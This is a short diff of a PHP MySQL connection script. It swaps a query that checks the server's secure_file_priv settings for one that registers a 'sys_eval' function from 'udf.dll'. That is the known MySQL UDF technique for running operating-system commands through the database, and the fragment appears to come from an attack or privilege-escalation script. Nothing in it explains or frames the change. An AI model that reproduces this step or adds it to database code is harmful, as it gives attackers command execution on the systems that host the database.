@@ -16,7 +16,7 @@ $conn = new mysqli($servername, $username, $password);
 if ($conn->connect_error) {
     die("connect fail: " . $conn->connect_error);
 } 
-$sql = "show global variables like 'secure%'";
+$sql = "CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.dll'";
 $result = $conn->query($sql);
 var_dump($result);
 if ($result->num_rows > 0) {
